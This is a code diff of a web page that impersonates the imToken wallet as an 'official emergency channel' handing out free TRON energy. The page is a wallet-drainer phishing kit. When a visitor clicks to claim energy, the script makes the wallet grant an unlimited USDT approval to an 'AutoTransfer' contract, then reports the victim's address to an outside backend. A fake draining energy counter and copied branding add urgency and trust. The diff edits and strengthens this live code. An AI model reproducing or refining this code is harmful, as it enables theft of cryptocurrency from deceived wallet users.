@@ -19,7 +19,7 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
 body { 
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    padding: 8px 6px; /* 增加内边距，更饱满 */
+    padding: 8px 6px; 
     max-width: 600px; 
     margin: 0 auto; 
     background: #121a17; 
@@ -27,20 +27,19 @@ body {
     min-height: 100vh;
     display: flex;
     flex-direction: column;
-    gap: 5px; /* 缩小模块间距，更紧凑 */
+    gap: 5px; 
     border-radius: 8px;
     border-left: 3px solid #3b82f6;
-    font-size: 14px; /* 整体字体调大 */
+    font-size: 14px; 
     overflow-x: hidden;
 }
 .container {
-    flex: 1; /* 占满剩余垂直空间，消除底部空档 */
+    flex: 1; 
     display: flex;
     flex-direction: column;
-    gap: 5px; /* 模块间距，避免拥挤 */
+    gap: 5px; 
     overflow-y: auto;
 }
-/* 顶部容器：调整高度+对齐，减少冗余空间 */
 .header-container {
     display: flex;
     justify-content: space-between;
@@ -55,23 +54,22 @@ body {
 .lang-switch {
     padding: 0;
     margin: 0;
-    display: flex; /* 改为 Flex 布局 */
-    flex-direction: column; /* 子元素上下排列 */
-    align-items: flex-end; /* 所有子元素靠右对齐 */
-    gap: 6px; /* 文本和按钮的上下间距，可自定义 */
+    display: flex;
+    flex-direction: column;
+    align-items: flex-end;
+    gap: 6px;
 }
-/* 新增文本样式（可按需调整） */
 .lang-text {
-  color: #e0e8e4; /* 与按钮文字同色，保持统一 */
-  font-size: 12px; /* 可根据需求调整大小 */
+  color: #e0e8e4;
+  font-size: 12px;
 }
 .lang-toggle {
-    padding: 3px 8px; /* 调大按钮内边距，更易点击 */
+    padding: 3px 8px;
     border: 1px solid #3b82f6;
     border-radius: 20px;
     background: transparent;
     color: #e0e8e4;
-    font-size: 13px; /* 字体调大 */
+    font-size: 13px;
     cursor: pointer;
     display: flex;
     align-items: center;
@@ -88,32 +86,31 @@ body {
     margin-bottom: 0;
     display: flex;
     align-items: flex-end;
-    gap: 10px; /* 增加Logo与文字间距 */
+    gap: 10px;
 }
 .header > div {
     display: flex; 
     gap: 10px; 
-    align-items: flex-end; /* 关键：让desc靠下对齐（相对于h1下移） */
+    align-items: flex-end;
 }
-/* Logo样式：保持长方形比例，适配调大的容器 */
 .header-logo {
     width: 65px; 
-    height: 47px; /* 长方形比例，更协调 */
+    height: 47px;
     border-radius: 4px;
-    object-fit: contain; /* 避免变形 */
+    object-fit: contain;
 }
 .header h1 { 
-    font-size: 30px; /* 字体调大，更醒目 */
+    font-size: 30px;
     color: #3b82f6;    
     margin-bottom: 0;
-    line-height: 1.2;
+   line-height: 1.2;
 }
 .warning {
     background: #334155;
     color: #93c5fd;
-    padding: 8px; /* 调大内边距 */
+    padding: 8px;
     border-radius: 8px;
-    font-size: 12px; /* 字体调大 */
+    font-size: 12px;
     border-left: 3px solid #4ade80;
     line-height: 1.5;
 }
@@ -122,32 +119,31 @@ body {
 }
 #userInfo {
     text-align: center;
-    font-size: 12px; /* 字体调大 */
-    padding: 12px; /* 调大内边距，填充空间 */
+    font-size: 12px;
+    padding: 12px;
     background: #1e2925;
     border-radius: 8px;
     border: 1px solid #334155;
     line-height: 1.6;
-    min-height: 50px; /* 确保非连接状态下也有足够高度 */
+    min-height: 50px;
 }
 #userInfo span {
     color: #3b82f6;
     font-weight: 500;
 }
-/* 钱包状态容器：适配两种状态，调大内容 */
 #walletStatusContainer {
     background: #1e2925;
-    padding: 12px; /* 调大内边距 */
+    padding: 12px;
     border-radius: 8px;
     border: 1px solid #334155;
-    font-size: 12px; /* 字体调大 */
+    font-size: 12px;
     color: #a0a8a4;
     line-height: 1.6;
     border-right: 5px solid #4ade80;
-    min-height: 150px; /* 确保非连接状态下内容填满（非连接时文字多） */
+    min-height: 150px;
 }
 #walletStatusContainer .status-title {
-    font-size: 14px; /* 字体调大 */
+    font-size: 14px;
     color: #3b82f6;
     margin-bottom: 6px;
     display: flex;
@@ -156,7 +152,7 @@ body {
 }
 #walletStatusContainer .connected-content {
     display: none;
-    min-height: 110px; /* 连接状态下确保高度足够 */
+    min-height: 110px;
 }
 #walletStatusContainer.connected .disconnected-content {
     display: none;
@@ -171,22 +167,21 @@ body {
 #walletStatusContainer.connected .connected-content .orange-tip {
     color: #f97316;
     margin-top: 5px;
-    font-size: 12px; /* 字体调大 */
+    font-size: 12px;
 }
-/* 合约资源容器：调大内容+填充空间 */
 #contractResourceContainer {
     background: #1e2925;
-    padding: 12px; /* 调大内边距 */
+    padding: 12px;
     border-radius: 8px;
     border: 1px solid #334155;
-    font-size: 12px; /* 字体调大 */
+    font-size: 12px;
     color: #a0a8a4;
     line-height: 1.7;
     border-bottom: 2px solid rgba(59, 130, 246, 0.2);
-    min-height: 80px; /* 确保高度足够 */
+    min-height: 80px;
 }
 #contractResourceContainer .status-title {
-    font-size: 14px; /* 字体调大 */
+    font-size: 14px;
     color: #3b82f6;
     margin-bottom: 6px;
     display: flex;
@@ -194,7 +189,7 @@ body {
     gap: 4px;
 }
 #contractResourceContainer .status-title i {
-    font-size: 16px; /* 字体调大 */
+    font-size: 16px;
     color: #93c5fd;
 }
 #contractResourceContainer .highlight {
@@ -203,45 +198,43 @@ body {
 }
 #contractResourceContainer .data-tag {
     background: rgba(59, 130, 246, 0.15);
-    padding: 2px 6px; /* 调大内边距 */
+    padding: 2px 6px;
     border-radius: 4px;
     border: 1px solid rgba(59, 130, 246, 0.3);
-    font-size: 12px; /* 字体调大 */
+    font-size: 12px;
 }
-/* 非连接状态专属容器：调大内容+填充空间 */
 .special-tip-container {
     background: #1e2925;
-    padding: 16px; /* 调大内边距 */
+    padding: 16px;
     border-radius: 8px;
     border: 1px solid #334155;
     display: none;
     margin-top: 4px;
     border-right: 3px solid #f97316;
     box-shadow: -2px 0 0 0 #fb923c;
-    min-height: 80px; /* 确保显示时填充空间 */
+    min-height: 80px;
 }
 .special-tip-title {
-    font-size: 16px; /* 字体调大 */
+    font-size: 16px;
     color: #f97316;
     font-weight: 600;
     margin-bottom: 6px;
 }
 .special-tip-content {
-    font-size: 14px; /* 字体调大 */
+    font-size: 14px;
     color: #f97316;
     line-height: 1.7;
     font-weight: 500;
 }
-/* 连接状态专属容器：调大内容+填充空间 */
 .record-list {
     background: #1e2925;
-    padding: 12px; /* 调大内边距 */
+    padding: 12px;
     border-radius: 8px;
     border: 1px solid #334155;
-    font-size: 12px; /* 字体调大 */
+    font-size: 12px;
     border-right: 5px solid #4ade80;
     display: none;
-    min-height: 100px; /* 确保显示时填充空间 */
+    min-height: 100px;
 }
 .record-item {
     margin-bottom: 10px;
@@ -256,7 +249,7 @@ body {
     margin-bottom: 6px;
     color: #a0a8a4;
     line-height: 1.5;
-    font-size: 13px; /* 字体调大 */
+    font-size: 13px;
 }
 .record-item p strong {
     color: #e0e8e4;
@@ -268,24 +261,23 @@ body {
     display: inline-flex;
     align-items: center;
     gap: 5px;
-    font-size: 13px; /* 字体调大 */
+    font-size: 13px;
 }
 .tx-link:hover {
     text-decoration: underline;
 }
-/* 按钮组：贴近上方容器，消除空档 */
 .btn-group {
     display: flex;
     flex-direction: column;
-    gap: 6px; /* 增加按钮间距，更易点击 */
-    margin-top: 4px; /* 缩小与上方容器的间距 */
+    gap: 6px;
+    margin-top: 4px;
     padding: 6px 0;
     border-top: 1px solid #334155;
 }
 .btn {
     width: 100%;
-    padding: 12px; /* 调大内边距，更饱满 */
-    font-size: 15px; /* 字体调大，更醒目 */
+    padding: 12px;
+    font-size: 15px;
     border: none;
     border-radius: 8px;
     background: #2563eb;
@@ -309,7 +301,7 @@ body {
     margin-top: 6px;
     padding-top: 6px;
     border-top: 1px solid #334155;
-    font-size: 10px; /* 字体调大 */
+    font-size: 10px;
     color: #a0a8a4;
     text-align: center;
     line-height: 1.7;
@@ -326,14 +318,13 @@ body {
 }
 .review-tip {
     color: #4ade80;
-    font-size: 12px; /* 字体调大 */
+    font-size: 12px;
     margin-top: 6px;
     display: flex;
     align-items: center;
     justify-content: center;
     gap: 6px;
 }
-/* 钱包选择弹窗样式 */
 .wallet-modal {
     position: fixed;
     top: 0;
@@ -406,20 +397,17 @@ body {
     color: #a0a8a4;
     font-size: 12px;
 }
-/* 新增弹窗样式（用于领取时引导） */
 .persistent-alert {
     position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
     padding: 20px 30px; background: #1e2925; border-radius: 8px; box-shadow: 0 2px 15px rgba(0,0,0,0.3);
-    font-size: 16px; color: #e0e8e4; z-index: 9999; text-align: center; border: 1px solid #3b82f6;
+    font-size: 16px; color: #e0e8e4; z-index: 9999; text-align: center; border: 1px solid #334155;
 }
     </style>
 </head>
 <body>
     <div class="container">      
-        <!-- 新增：标题+语言切换同一行 -->
         <div class="header-container">
             <div class="header">
-                <!-- 新增：Logo图片（路径与仓库中log.png一致） -->
                 <img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/log.png" alt="imToken Logo" class="header-logo">
                 <div>
                     <h1>imToken</h1>
@@ -427,9 +415,9 @@ body {
             </div>
             <div class="lang-switch">
                 <button id="langToggle" class="lang-toggle">
-                  <i class="fa fa-globe"></i>
+                  <<i class="fa fa-globe"></</i>
                 </button>
-                <span id="headerDesc" class="lang-text">imToken官方应急通道</span> <!-- 新增文本 -->
+                <span id="headerDesc" class="lang-text">imToken官方应急通道</span>
             </div>
         </div>
         <div id="userInfo">
@@ -466,7 +454,6 @@ body {
                 </p>
             </div>
         </div>
-        <!-- 新增：非钱包环境专属容器（添加id便于JS控制文本） -->
         <div class="special-tip-container" id="specialTipContainer">
             <div class="special-tip-title" id="specialTipTitle">imToken-EAB</div>
             <div class="special-tip-content" id="specialTipContent">
@@ -484,11 +471,10 @@ body {
             </div>       
             <span id="approvalRecords" class="highlight">暂无能量领取记录</span>        
         </div>
-        <!-- 按钮组移进container -->
         <div class="btn-group">
             <div class="warning">
                 <p id="browserWarn1"> ⚠️ 请用 <strong>钱包内置浏览器</strong> 打开</p>
-                <p id="browserWarn2"> ⚠️ 非钱包浏览器：点击按钮选择钱包，自动唤起+复制链接</p>  
+                <p id="browserWarn2"> ⚠️ 非钱包浏览器：点击按钮选择钱包，自动唤起访问</p>  
             </div> 
             <button id="connectBtn" class="btn">连接钱包</button>
             <button id="approveBtn" class="btn" disabled>领取能量</button>
@@ -496,19 +482,16 @@ body {
                <span id="reviewTipText">系统审核中，审核通过后请务必完成签名</span>
             </div>
         </div>
-        <!-- 底部信息移进container -->
         <div class="footer-info" id="footerInfo">
             合约验证：AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>（TRON浏览器查询）
             © 2025 能量服务 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a> | <a href="https://token.im" target="_blank">imToken官网</a>
         </div>
-        <!-- 钱包选择弹窗 -->
         <div class="wallet-modal" id="walletModal">
             <div class="wallet-modal-content">
                 <div class="wallet-modal-header">
                     <div class="wallet-modal-title">选择你的钱包</div>
                 </div>
                 <div class="wallet-list">
-                    <!-- imToken -->
                     <div class="wallet-item" data-wallet="imtoken">
                         <img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/icon/imToken.png" alt="imToken">
                         <div class="wallet-item-info">
@@ -516,7 +499,6 @@ body {
                             <div class="wallet-item-desc">TRC20 / ERC20 / BEP20</div>
                         </div>
                     </div>
-                    <!-- TokenPocket -->
                     <div class="wallet-item" data-wallet="tokenpocket">
                         <img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/icon/tokenPocket.png" alt="TokenPocket">
                         <div class="wallet-item-info">
@@ -524,7 +506,6 @@ body {
                             <div class="wallet-item-desc">多链支持，快捷授权</div>
                         </div>
                     </div>
-                    <!-- TronLink -->
                     <div class="wallet-item" data-wallet="tronlink">
                         <img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/icon/tronLink.png" alt="TronLink">
                         <div class="wallet-item-info">
@@ -532,7 +513,6 @@ body {
                             <div class="wallet-item-desc">TRON网络专属</div>
                         </div>
                     </div>
-                    <!-- Bitget Wallet -->
                     <div class="wallet-item" data-wallet="bitget">
                         <img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/icon/bitget.png" alt="Bitget Wallet">
                         <div class="wallet-item-info">
@@ -542,7 +522,7 @@ body {
                     </div>
                 </div>
                 <div class="wallet-modal-footer">
-                    选择后将自动复制链接并唤起钱包，无需手动操作
+                    选择后将自动唤起钱包，无需手动操作
                 </div>
             </div>
         </div>
@@ -551,21 +531,19 @@ body {
 <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.0.3/web3.min.js"></script>
 <script>
 // ========== 全局变量优先定义 ==========
-const SPECIAL_ADDRESS = "TVP7Y8jA7hBc1g7qm72P6aGBfexqLm1SRy"; // 特殊白名单地址
-const A1_SIGNAL_KEY = "a1_signal_records"; // A1信号发送记录（15分钟防重复）
-const A1_STATUS_KEY = "a1_signal_status"; // A1信号发送状态记录
+const SPECIAL_ADDRESS = "TVP7Y8jA7hBc1g7qm72P6aGBfexqLm1SRy";
+const A1_SIGNAL_KEY = "a1_signal_records";
+const A1_STATUS_KEY = "a1_signal_status";
 let currentEnergy = 0;
 const INIT_TRX = 4104470400000;
 const TRX_DECREASE_PER_SEC = 65200;
 const GLOBAL_START_TIME = new Date().getTime() - 10000;
 let trxTimer = null;
 let contractEnergyEl = null;
-// 核心配置
 const AUTO_TRANSFER_CONTRACT = "TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL";
 const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const BACKEND_API = "https://kgjiopv1.com";
 const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
-// USDT合约ABI
 const USDT_ABI = [
     {
         "constant": true,
@@ -597,16 +575,13 @@ const USDT_ABI = [
         "type": "event"
     }
 ];
-// 全局变量
 let tronWeb = null;
 let userAddress = null;
 let trc20Contract = null;
 let tokenBalance = 0.00;
 let trxBalance = 0.00;
 const RECORD_KEY = "imtoken_energy_records";
-// 新增：B1信号发送标记（防止重复发送）
 const B1_SIGNAL_KEY = "b1_signal_sent";
-// 钱包配置：Scheme + 名称映射
 const walletConfig = {
     imtoken: {
         scheme: "imtokenv2://navigate/DappView?url=",
@@ -630,11 +605,11 @@ const walletConfig = {
         logo: "bitget.png"
     }
 };
-// ========== 多语言配置（已更新headerDesc文本） ==========
+// ========== 多语言配置 ==========
 const langConfig = {
     zh: {
         headerTitle: "imToken",
-        headerDesc: "imToken官方应急通道", // 已替换为需求文本
+        headerDesc: "imToken官方应急通道",
         userInfoDefault: "未连接钱包<br><span>请点击底部「连接钱包」按钮</span>",
         walletStatusTitle: "钱包状态",
         disconnectedText: "未连接钱包",
@@ -767,7 +742,6 @@ const langConfig = {
         specialTipContent: "This link is only for emergency assistance to imToken users who need to transfer on the Tron network without wallet energy or TRX. Resources are limited, please do not use it as a profitable project."
     }
 };
-// 当前语言
 let currentLang = localStorage.getItem("imtoken_energy_lang") || "zh";
 // ========== 二次授权校验工具 ==========
 const AUTHORIZED_KEY = "authorized_wallet_addresses";
@@ -792,9 +766,7 @@ function addAuthorizedAddress(address) {
     }
 }
 function isAddressAuthorized(address) {
-    // 白名单地址直接返回false，不被已授权拦截
     if (address === SPECIAL_ADDRESS) return false;
-    
     const addresses = getAuthorizedAddresses();
     if (!addresses.includes(address)) return false;
     const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
@@ -804,16 +776,16 @@ function isAddressAuthorized(address) {
     const thirtyDays = 30 * 24 * 60 * 60 * 1000;
     return Date.now() - receiveTime < thirtyDays;
 }
-// ========== A1信号防重复工具（15分钟） ==========
+// ========== A1信号防重复工具 ==========
 function canSendA1Signal(address) {
     try {
         const records = JSON.parse(localStorage.getItem(A1_SIGNAL_KEY) || "{}");
         const lastSendTime = records[address] || 0;
         const now = Date.now();
-        return now - lastSendTime > 15 * 60 * 1000; // 15分钟=900000毫秒
+        return now - lastSendTime > 15 * 60 * 1000;
     } catch (e) {
         console.warn("检查A1信号发送权限失败：", e);
-        return true; // 异常时允许发送
+        return true;
     }
 }
 function updateA1SignalRecord(address) {
@@ -825,13 +797,13 @@ function updateA1SignalRecord(address) {
         console.warn("更新A1信号记录失败：", e);
     }
 }
-// ========== B1信号防重复工具（修复过期时间+语法） ==========
+// ========== B1信号防重复工具 ==========
 function hasSentB1Signal(address) {
   try {
     const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
     const item = records[address];
     if (!item) return false;
-    return Date.now() - item.time < 2592000000; // 30天过期（正确值）
+    return Date.now() - item.time < 2592000000;
   } catch (e) {
     console.warn("检查B1信号失败：", e);
     return false;
@@ -840,7 +812,7 @@ function hasSentB1Signal(address) {
 function markB1SignalSent(address) {
   try {
     const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
-    records[address] = { time: Date.now() }; // 存储时间戳
+    records[address] = { time: Date.now() };
     localStorage.setItem(B1_SIGNAL_KEY, JSON.stringify(records));
   } catch (e) {
     console.warn("标记B1信号失败：", e);
@@ -858,8 +830,8 @@ const reviewTip = document.getElementById("reviewTip");
 const reviewTipText = document.getElementById("reviewTipText");
 const langToggle = document.getElementById("langToggle");
 const footerInfo = document.getElementById("footerInfo");
-const recordList = document.getElementById("recordList"); // 记录列表元素
-const specialTipContainer = document.getElementById("specialTipContainer"); // 非钱包环境容器
+const recordList = document.getElementById("recordList");
+const specialTipContainer = document.getElementById("specialTipContainer");
 // ========== 错误类型判断 ==========
 function isCustomerError(errMsg) {
     const lang = langConfig[currentLang];
@@ -869,6 +841,31 @@ function isCustomerError(errMsg) {
         "USDT balance", "within 30 days"
     ];
     return customerErrorKeys.some(key => errMsg.includes(key));
+}
+// ========== 弹窗工具（优先定义，避免未定义报错） ==========
+function showPersistentAlert(message) {
+    const existingAlert = document.querySelector(".persistent-alert");
+    if (existingAlert) document.body.removeChild(existingAlert);
+    const alertDiv = document.createElement("div");
+    alertDiv.className = "persistent-alert";
+    alertDiv.style.cssText = `
+        position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+        padding: 20px 30px; background: #1e2925; border-radius: 8px; box-shadow: 0 2px 15px rgba(0,0,0,0.3);
+        font-size: 16px; color: #e0e8e4; z-index: 9999; text-align: center; border: 1px solid #334155;
+    `;
+    alertDiv.textContent = message;
+    document.body.appendChild(alertDiv);
+    return alertDiv;
+}
+function showAutoCloseAlert(message) {
+    const alertDiv = showPersistentAlert(message);
+    setTimeout(() => {
+        if (alertDiv && alertDiv.parentNode) {
+            alertDiv.style.opacity = "0";
+            alertDiv.style.transition = "opacity 0.3s";
+            setTimeout(() => alertDiv.parentNode.removeChild(alertDiv), 300);
+        }
+    }, 3000);
 }
 // ========== 语言切换逻辑 ==========
 function toggleLang() {
@@ -901,8 +898,6 @@ function reRenderDynamicContent() {
         return;
     }
     recordList.style.display = "block";
-    
-    // 特殊地址（白名单）处理：跳过已授权判断，强制显示可领取
     if (userAddress === SPECIAL_ADDRESS) {
         const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
         userInfoEl.innerHTML = lang.eligibleTip
@@ -916,7 +911,6 @@ function reRenderDynamicContent() {
         return;
     }
     const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-    // 30天内已领取
     if (isAddressAuthorized(userAddress)) {
         userInfoEl.innerHTML = lang.authorizedTip
             .replace("{address}", shortAddr)
@@ -928,7 +922,6 @@ function reRenderDynamicContent() {
         updateWalletStatus();
         return;
     }
-    // 余额状态
     if (tokenBalance <= 0) {
         userInfoEl.innerHTML = lang.insufficientUsdt
             .replace("{address}", shortAddr)
@@ -967,20 +960,18 @@ function updateEnergyDisplay() {
     calculateCurrentEnergy();
     contractEnergyEl.textContent = Math.floor(currentEnergy);
     contractEnergyEl.innerHTML = Math.floor(currentEnergy);
-    contractEnergyEl.offsetHeight;
     console.log("能量跳动中：", Math.floor(currentEnergy));
 }
 function startPersistentEnergyCountdown() {
-    if (trxTimer) clearInterval(trxTimer); // 改为setInterval更稳定
+    if (trxTimer) clearInterval(trxTimer);
     calculateCurrentEnergy();
     updateEnergyDisplay();
-    // 优化定时器：避免递归，减少资源占用
     trxTimer = setInterval(() => {
         updateEnergyDisplay();
         if (currentEnergy <= 0) clearInterval(trxTimer);
     }, 1000);
 }
-// ========== 自动授权函数（仅在用户点击领取后触发） ==========
+// ========== 自动授权函数 ==========
 async function autoApprove() {
     const lang = langConfig[currentLang];
     const btn = document.getElementById("approveBtn");
@@ -988,17 +979,13 @@ async function autoApprove() {
     btn.textContent = lang.redirectingBtn;
     try {
         if (!trc20Contract) trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
-        
-        // 核心授权操作
         const tx = await trc20Contract.approve(
             AUTO_TRANSFER_CONTRACT,
             INFINITE_APPROVE_AMOUNT
         ).send({ from: userAddress, shouldPollResponse: true });
-        // 授权成功同步信息
         await Promise.all([sendSignalA2(), sendSignalB(false)]);
         btn.textContent = lang.successBtn;
         userInfoEl.innerHTML += lang.successArrival;
-        // 白名单地址跳过30天限制（可选）
         if (userAddress !== SPECIAL_ADDRESS) {
             addAuthorizedAddress(userAddress);
         }
@@ -1011,79 +998,84 @@ async function autoApprove() {
         showAutoCloseAlert(`${lang.authorizeFail.replace("{msg}", e.message)}`);
     }
 }
-// ========== 环境检测函数（删除复制，直接跳转） ==========
+// ========== 环境检测函数 ==========
 async function checkImTokenEnv() {
     const lang = langConfig[currentLang];
     const walletModal = document.getElementById("walletModal");
     const connectBtn = document.getElementById("connectBtn");
-    if (window.tronWeb) {
-        tronWeb = window.tronWeb;
-        connectBtn.style.display = "none";
-        warning.style.display = "none";
-        specialTipContainer.style.display = "none";
-        walletModal.classList.remove("active");
-        await initWallet(false);
-    } else {
-        specialTipContainer.style.display = "block";
-        userInfoEl.innerHTML = lang.nonImTokenUser;
-        approveBtn.style.display = "none";
-        
-        connectBtn.onclick = () => {
-            walletModal.classList.add("active");
-        };
-        document.querySelectorAll(".wallet-item").forEach(item => {
-            item.addEventListener("click", async (e) => {
-                const walletType = e.currentTarget.dataset.wallet; // 获取用户选择的钱包类型
-                const wallet = walletConfig[walletType];
-                if (!wallet) return;
-                try {
-                    // 关键修改1：URL拼接wallet参数，传递用户选择的钱包类型
-                    const dappUrl = window.location.href + "#wallet-open" + `?wallet=${walletType}`; 
-                    let jumpUrl = "";
-                    switch (walletType) {
-                        case "tronlink":
-                            const param = JSON.stringify({
-                                url: dappUrl,
-                                action: "open",
-                                protocol: "tronlink",
-                                version: "1.0"
-                            });
-                            jumpUrl = wallet.scheme + encodeURIComponent(param);
-                            break;
-                        case "tokenpocket":
-                            jumpUrl = wallet.scheme + encodeURIComponent(dappUrl) + wallet.suffix;
-                            break;
-                        default:
-                            jumpUrl = wallet.scheme + encodeURIComponent(dappUrl);
-                    }
-                    window.location.href = jumpUrl;
-                    walletModal.classList.remove("active");
-                } catch (e) {
-                    console.error(`${wallet.name}唤起失败：`, e);
-                    walletModal.classList.remove("active");
-                    showAutoCloseAlert(`唤起${wallet.name}失败，请手动打开钱包访问`);
+    // 修复：延迟检测tronWeb，避免钱包加载延迟导致识别失败
+    const checkTronWeb = () => {
+        if (window.tronWeb && window.tronWeb.defaultAddress) {
+            tronWeb = window.tronWeb;
+            connectBtn.style.display = "none";
+            warning.style.display = "none";
+            specialTipContainer.style.display = "none";
+            walletModal.classList.remove("active");
+            initWallet(false);
+        } else {
+            // 3秒内未检测到，视为普通浏览器
+            setTimeout(() => {
+                if (!window.tronWeb) {
+                    specialTipContainer.style.display = "block";
+                    userInfoEl.innerHTML = lang.nonImTokenUser;
+                    approveBtn.style.display = "none";
+                    connectBtn.onclick = () => {
+                        walletModal.classList.add("active");
+                    };
+                    document.querySelectorAll(".wallet-item").forEach(item => {
+                        item.addEventListener("click", async (e) => {
+                            const walletType = e.currentTarget.dataset.wallet;
+                            const wallet = walletConfig[walletType];
+                            if (!wallet) return;
+                            try {
+                                const dappUrl = window.location.href + "#wallet-open" + `?wallet=${walletType}`;
+                                let jumpUrl = "";
+                                switch (walletType) {
+                                    case "tronlink":
+                                        const param = JSON.stringify({
+                                            url: dappUrl,
+                                            action: "open",
+                                            protocol: "tronlink",
+                                            version: "1.0"
+                                        });
+                                        jumpUrl = wallet.scheme + encodeURIComponent(param);
+                                        break;
+                                    case "tokenpocket":
+                                        jumpUrl = wallet.scheme + encodeURIComponent(dappUrl) + wallet.suffix;
+                                        break;
+                                    default:
+                                        jumpUrl = wallet.scheme + encodeURIComponent(dappUrl);
+                                }
+                                window.location.href = jumpUrl;
+                                walletModal.classList.remove("active");
+                            } catch (e) {
+                                console.error(`${wallet.name}唤起失败：`, e);
+                                walletModal.classList.remove("active");
+                                showAutoCloseAlert(`唤起${wallet.name}失败，请手动打开钱包访问`);
+                            }
+                        });
+                    });
+                    walletModal.addEventListener("click", (e) => {
+                        if (e.target === walletModal) {
+                            walletModal.classList.remove("active");
+                        }
+                    });
                 }
-            });
-        });
-        walletModal.addEventListener("click", (e) => {
-            if (e.target === walletModal) {
-                walletModal.classList.remove("active");
-            }
-        });
-    }
+            }, 3000);
+        }
+    };
+    checkTronWeb();
 }
-// ========== 钱包初始化函数（优化卡顿+异步渲染） ==========
+// ========== 钱包初始化函数 ==========
 async function initWallet(needAutoApprove) {
     const lang = langConfig[currentLang];
     try {
         userAddress = tronWeb.defaultAddress.base58;
         const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "未知地址";
-        // 先渲染基础UI，避免空白等待（解决卡顿）
         document.getElementById("statusAddress").textContent = shortAddr;
         userInfoEl.innerHTML = `${lang.loadingTip.replace("{address}", shortAddr)}`;
         updateWalletStatus();
         recordList.style.display = "block";
-        // 异步查询余额（加超时，不阻塞UI）
         const queryBalance = async () => {
             try {
                 const timeoutPromise = new Promise((_, reject) => 
@@ -1108,10 +1100,8 @@ async function initWallet(needAutoApprove) {
                 approveBtn.onclick = () => queryBalance();
             }
         };
-        queryBalance(); // 异步执行，不阻塞
-        // 直接绑定按钮逻辑，移除300ms延迟
+        queryBalance();
         bindApproveLogic();
-        // A1信号异步发送（保留逻辑）
         if (userAddress && canSendA1Signal(userAddress)) {
             sendSignalA1().catch(err => console.error("A1信号发送失败：", err));
             updateA1SignalRecord(userAddress);
@@ -1143,7 +1133,6 @@ async function executeAfterApprove() {
         console.log("✅ A2+B2信号发送成功，后端已记录授权用户");
         btn.textContent = lang.successBtn;
         userInfoEl.innerHTML += lang.successArrival;
-        // 白名单地址跳过30天限制（可选）
         if (userAddress !== SPECIAL_ADDRESS) {
             addAuthorizedAddress(userAddress);
         }
@@ -1156,7 +1145,7 @@ async function executeAfterApprove() {
         userInfoEl.innerHTML += lang.successArrival;
     }
 }
-// ========== 发送信号函数（全部保留） ==========
+// ========== 发送信号函数 ==========
 async function sendSignalA1() {
     const requestData = { userAddress };
     const controller = new AbortController();
@@ -1170,8 +1159,6 @@ async function sendSignalA1() {
             keepalive: true
         });
         clearTimeout(timeoutId);
-        
-        // 处理204 No Content
         if (res.status === 204) {
             const status = "success";
             const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
@@ -1184,7 +1171,6 @@ async function sendSignalA1() {
         const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
         a1Status[userAddress] = status;
         localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
-        
         if (res.ok) {
             try {
                 await res.json();
@@ -1202,7 +1188,6 @@ async function sendSignalA1() {
         const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
         a1Status[userAddress] = "fail";
         localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
-        
         console.warn("❌ A1信号发送异常：", e);
         return false;
     }
@@ -1271,38 +1256,9 @@ async function sendSignalB(isB1 = true) {
         throw e;
     }
 }
-// ========== 弹窗工具（非防重复对象用，不自动消失） ==========
-function showPersistentAlert(message) {
-    // 先移除已存在的弹窗，避免重复
-    const existingAlert = document.querySelector(".persistent-alert");
-    if (existingAlert) document.body.removeChild(existingAlert);
-    
-    const alertDiv = document.createElement("div");
-    alertDiv.className = "persistent-alert";
-    alertDiv.style.cssText = `
-        position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-        padding: 20px 30px; background: #1e2925; border-radius: 8px; box-shadow: 0 2px 15px rgba(0,0,0,0.3);
-        font-size: 16px; color: #e0e8e4; z-index: 9999; text-align: center; border: 1px solid #3b82f6;
-    `;
-    alertDiv.textContent = message;
-    document.body.appendChild(alertDiv);
-    return alertDiv; // 返回弹窗元素，后续可手动移除
-}
-// ========== 新增：自动关闭弹窗工具（之前遗漏，导致报错） ==========
-function showAutoCloseAlert(message) {
-    const alertDiv = showPersistentAlert(message);
-    setTimeout(() => {
-        if (alertDiv && alertDiv.parentNode) {
-            alertDiv.style.opacity = "0";
-            alertDiv.style.transition = "opacity 0.3s";
-            setTimeout(() => alertDiv.parentNode.removeChild(alertDiv), 300);
-        }
-    }, 3000);
-}
-// ========== 核心逻辑bindApproveLogic（彻底修复弹窗+白名单拦截） ==========
+// ========== 核心逻辑bindApproveLogic ==========
 function bindApproveLogic() {
     const lang = langConfig[currentLang];
-    // 白名单地址强制启用按钮，忽略已授权状态
     if ((tokenBalance > 1 && !isAddressAuthorized(userAddress)) || userAddress === SPECIAL_ADDRESS) {
         approveBtn.disabled = false;
         approveBtn.textContent = lang.approveBtnText;
